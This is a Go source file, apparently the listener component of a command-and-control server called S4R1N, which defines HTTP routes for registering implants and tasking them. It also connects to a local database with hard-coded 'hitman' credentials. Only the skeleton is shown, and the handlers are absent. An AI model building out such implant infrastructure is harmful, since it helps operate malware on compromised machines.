package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

const (
	Art = `
                                                                       
	────────────────▌─────────────────
	───────────────▄▌─────────────────
	──────────────▐█──────────────────
	──────────────▐█──────────────────
	───────────────█▌─▀▀███▄──────────
	───────────────██────▀█████▄──────
	──────▄▄███▀▀──▐█▌─────▀█████▄────
	──▄▄████▀▀─────▐█▌─────▄███▀▀─────
	──▀█████▄──────██────▄███▀────────
	──────▀███▄▄▄▄────▄███▀▀─────────▄
	─────────▀█████▌▐███───────────▄██
	▄───────────███▌▐████▄▄─────▄████▀
	██▄────▄▄██████▌▐████████▄▄█████▀─
	███████████████▌▐██▀───▀███████───
	─██████▀───▀▀██▌▐▀──────█████▀────
	──▀████▄──────▀▌──────▄████▀──────
	─────▀███▄────────▄▄████▀▀────────
	────────▀▀█▄ ───────────S4R1N-────
	──────────────────────────────────      
                                 
	- Listener - 

	`
)

var db *sql.DB

func handleRequests() {

	myRouter := mux.NewRouter().StrictSlash(true)

	// Implant Registeration
	myRouter.HandleFunc("/register", register).Methods("POST")
	// Implant Tasking
	myRouter.HandleFunc("/info", taskserv).Methods("GET")
	myRouter.HandleFunc("/info", taskresp).Methods("POST")

	log.Fatal(http.ListenAndServe(":8080", myRouter))

}

func main() {

	db = conn("localhost", 5432, "hitman", "hitman", "hitman")

	fmt.Println(Art)
	fmt.Println("[+] Registeration API Up")
	fmt.Println("[+] Callback API Up ")
	handleRequests()

}
